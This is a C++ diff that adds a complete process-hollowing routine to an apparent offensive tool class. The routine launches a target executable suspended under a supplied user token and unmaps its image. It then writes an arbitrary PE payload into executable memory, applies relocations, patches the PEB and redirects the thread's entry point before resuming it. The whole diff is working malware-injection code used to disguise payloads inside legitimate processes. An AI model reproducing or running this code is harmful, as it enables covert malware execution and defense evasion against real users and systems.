@@ -298,3 +298,238 @@ bool ProcessHollower::HollowProcess(const wchar_t* target_exe, const std::vector
 
     return true;
 }
+
+bool ProcessHollower::create_suspended_process_as_user(const wchar_t* target_path, HANDLE hToken) {
+    STARTUPINFOW si = {};
+    PROCESS_INFORMATION pi = {};
+
+    if (verbose) std::cout << "[*] Creating suspended process as user..." << std::endl << std::flush;
+
+    si.cb = sizeof(STARTUPINFOW);
+
+    // Use CreateProcessAsUserW with the provided token
+    // This creates the process with the token's session context (Session 1 for interactive users)
+    BOOL result = CreateProcessAsUserW(
+        hToken,
+        target_path,
+        nullptr,
+        nullptr,
+        nullptr,
+        FALSE,
+        CREATE_SUSPENDED,
+        nullptr,
+        nullptr,
+        &si,
+        &pi
+    );
+
+    if (!result) {
+        DWORD err = GetLastError();
+        std::cout << "[-] CreateProcessAsUserW failed: error " << err << std::endl << std::flush;
+        return false;
+    }
+
+    hProcess = pi.hProcess;
+    hThread = pi.hThread;
+    processId = pi.dwProcessId;
+
+    if (verbose) std::cout << "[+] Process created as user: PID " << processId << std::endl << std::flush;
+
+    return true;
+}
+
+bool ProcessHollower::HollowProcessAsUser(const wchar_t* target_exe, const std::vector<uint8_t>& payload, HANDLE hToken) {
+    if (verbose) std::cout << "[*] Parsing payload PE header..." << std::endl << std::flush;
+
+    // Parse source payload PE
+    auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)payload.data();
+    if (lpImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        std::cout << "[-] Invalid payload DOS signature\n" << std::flush;
+        return false;
+    }
+
+    auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)payload.data() + lpImageDOSHeader->e_lfanew);
+    if (lpImageNTHeader->Signature != IMAGE_NT_SIGNATURE) {
+        std::cout << "[-] Invalid payload PE signature\n" << std::flush;
+        return false;
+    }
+
+    if (verbose) {
+        std::cout << "[+] Payload architecture: " << (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC ? "x64" : "x86") << std::endl;
+        std::cout << "[+] Payload ImageBase: 0x" << std::hex << lpImageNTHeader->OptionalHeader.ImageBase << std::dec << std::endl;
+        std::cout << "[+] Payload SizeOfImage: 0x" << std::hex << lpImageNTHeader->OptionalHeader.SizeOfImage << std::dec << std::endl << std::flush;
+    }
+
+    if (!create_suspended_process_as_user(target_exe, hToken)) {
+        std::cout << "[-] Failed to create suspended process as user\n" << std::flush;
+        return false;
+    }
+
+    // Rest of hollowing logic is identical to HollowProcess
+    // Get PEB address
+    PROCESS_BASIC_INFORMATION pbi = {};
+    ULONG ReturnLength = 0;
+    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &ReturnLength);
+    if (!NT_SUCCESS(status)) {
+        std::cout << "[-] NtQueryInformationProcess failed: " << status << std::endl << std::flush;
+        TerminateProcess(hProcess, 0);
+        return false;
+    }
+
+    if (verbose) std::cout << "[+] PEB base address: 0x" << std::hex << (uintptr_t)pbi.PebBaseAddress << std::dec << std::endl << std::flush;
+
+    // Read ImageBase from PEB
+    DWORD64 image_base = 0;
+    if (!ReadProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10), &image_base, sizeof(DWORD64), nullptr)) {
+        std::cout << "[-] ReadProcessMemory (ImageBase) failed: " << GetLastError() << std::endl << std::flush;
+        TerminateProcess(hProcess, 0);
+        return false;
+    }
+
+    if (verbose) std::cout << "[+] Target process ImageBase: 0x" << std::hex << image_base << std::dec << std::endl << std::flush;
+
+    // Unmap target image
+    status = NtUnmapViewOfSection(hProcess, (PVOID)image_base);
+    if (!NT_SUCCESS(status)) {
+        std::cout << "[-] NtUnmapViewOfSection failed: " << status << std::endl << std::flush;
+        TerminateProcess(hProcess, 0);
+        return false;
+    }
+
+    if (verbose) std::cout << "[+] Target image unmapped" << std::endl << std::flush;
+
+    // Allocate new region for payload
+    LPVOID lpAllocAddress = VirtualAllocEx(hProcess, (PVOID)lpImageNTHeader->OptionalHeader.ImageBase,
+                                          lpImageNTHeader->OptionalHeader.SizeOfImage,
+                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if (!lpAllocAddress) {
+        // Try allocation at any address if preferred ImageBase is unavailable
+        lpAllocAddress = VirtualAllocEx(hProcess, nullptr,
+                                       lpImageNTHeader->OptionalHeader.SizeOfImage,
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!lpAllocAddress) {
+            std::cout << "[-] VirtualAllocEx failed: " << GetLastError() << std::endl << std::flush;
+            TerminateProcess(hProcess, 0);
+            return false;
+        }
+        if (verbose) std::cout << "[!] Preferred ImageBase unavailable, allocated at 0x" << std::hex << (uintptr_t)lpAllocAddress << std::dec << std::endl << std::flush;
+    } else {
+        if (verbose) std::cout << "[+] Payload allocated at preferred ImageBase: 0x" << std::hex << (uintptr_t)lpAllocAddress << std::dec << std::endl << std::flush;
+    }
+
+    // Write payload headers
+    if (verbose) std::cout << "[*] Writing PE headers..." << std::endl << std::flush;
+    size_t headers_size = lpImageNTHeader->OptionalHeader.SizeOfHeaders;
+    if (!WriteProcessMemory(hProcess, lpAllocAddress, payload.data(), headers_size, nullptr)) {
+        std::cout << "[-] WriteProcessMemory (headers) failed: " << GetLastError() << std::endl << std::flush;
+        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
+        TerminateProcess(hProcess, 0);
+        return false;
+    }
+
+    if (verbose) std::cout << "[+] Headers written (" << headers_size << " bytes)" << std::endl << std::flush;
+
+    // Write sections
+    if (verbose) std::cout << "[*] Writing sections..." << std::endl << std::flush;
+    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(lpImageNTHeader);
+
+    for (int i = 0; i < lpImageNTHeader->FileHeader.NumberOfSections; i++) {
+        DWORD section_size = pSectionHeader[i].SizeOfRawData;
+        DWORD section_offset = pSectionHeader[i].PointerToRawData;
+        DWORD virtual_addr = pSectionHeader[i].VirtualAddress;
+
+        if (section_size == 0) continue;
+
+        if (!WriteProcessMemory(hProcess,
+                               (PVOID)((uintptr_t)lpAllocAddress + virtual_addr),
+                               payload.data() + section_offset,
+                               section_size,
+                               nullptr)) {
+            std::cout << "[-] WriteProcessMemory (section " << i << ") failed: " << GetLastError() << std::endl << std::flush;
+            VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
+            TerminateProcess(hProcess, 0);
+            return false;
+        }
+
+        if (verbose) {
+            std::cout << "[+] Section " << i << " (" << (char*)pSectionHeader[i].Name << ") written: "
+                     << section_size << " bytes at 0x" << std::hex << virtual_addr << std::dec << std::endl << std::flush;
+        }
+    }
+
+    // Fix relocations
+    DWORD64 delta_image_base = (DWORD64)lpAllocAddress - lpImageNTHeader->OptionalHeader.ImageBase;
+
+    if (delta_image_base != 0) {
+        if (verbose) std::cout << "[*] ImageBase delta: 0x" << std::hex << delta_image_base << std::dec << " - fixing relocations..." << std::endl << std::flush;
+
+        PIMAGE_DATA_DIRECTORY reloc_dir = &lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        if (reloc_dir->Size > 0) {
+            DWORD reloc_offset = reloc_dir->VirtualAddress;
+            DWORD reloc_size = reloc_dir->Size;
+            DWORD bytes_processed = 0;
+
+            while (bytes_processed < reloc_size) {
+                auto base_reloc = (PIMAGE_BASE_RELOCATION)((uintptr_t)payload.data() + reloc_offset + bytes_processed);
+
+                if (base_reloc->SizeOfBlock == 0) break;
+
+                DWORD entries_count = (base_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);
+
+                for (DWORD i = 0; i < entries_count; i++) {
+                    auto reloc_entry = (PIMAGE_RELOCATION_ENTRY)((uintptr_t)base_reloc + sizeof(IMAGE_BASE_RELOCATION) +
+                                                                 i * sizeof(IMAGE_RELOCATION_ENTRY));
+                    reloc_offset += sizeof(IMAGE_RELOCATION_ENTRY);
+
+                    if (reloc_entry->Type == 0) continue;
+
+                    DWORD64 address_location = (DWORD64)lpAllocAddress + base_reloc->VirtualAddress + reloc_entry->Offset;
+                    DWORD64 patched_addr = 0;
+
+                    ReadProcessMemory(hProcess, (LPVOID)address_location, &patched_addr, sizeof(DWORD64), nullptr);
+                    patched_addr += delta_image_base;
+                    WriteProcessMemory(hProcess, (LPVOID)address_location, &patched_addr, sizeof(DWORD64), nullptr);
+                }
+            }
+            if (verbose) std::cout << "[+] Relocations fixed" << std::endl << std::flush;
+        }
+    }
+
+    // Update PEB ImageBase
+    if (verbose) std::cout << "[*] Updating PEB..." << std::endl << std::flush;
+    DWORD64 new_image_base = (DWORD64)lpAllocAddress;
+    if (!WriteProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10),
+                           &new_image_base, sizeof(new_image_base), nullptr)) {
+        std::cout << "[!] Warning: Could not update PEB ImageBase" << std::endl << std::flush;
+    }
+
+    // Get thread context and set EntryPoint
+    CONTEXT ctx = {};
+    ctx.ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(hThread, &ctx)) {
+        std::cout << "[-] GetThreadContext failed: error " << GetLastError() << std::endl << std::flush;
+        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
+        TerminateProcess(hProcess, 0);
+        return false;
+    }
+
+    ctx.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader->OptionalHeader.AddressOfEntryPoint;
+
+    if (!SetThreadContext(hThread, &ctx)) {
+        std::cout << "[-] SetThreadContext failed: error " << GetLastError() << std::endl << std::flush;
+        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
+        TerminateProcess(hProcess, 0);
+        return false;
+    }
+
+    if (verbose) std::cout << "[+] Thread context updated (RCX = 0x" << std::hex << ctx.Rcx << ")" << std::dec << std::endl << std::flush;
+
+    // Resume thread
+    if (verbose) std::cout << "[*] Resuming thread..." << std::endl << std::flush;
+    ResumeThread(hThread);
+
+    if (verbose) std::cout << "[+] Process hollowing complete!" << std::endl << std::flush;
+
+    return true;
+}
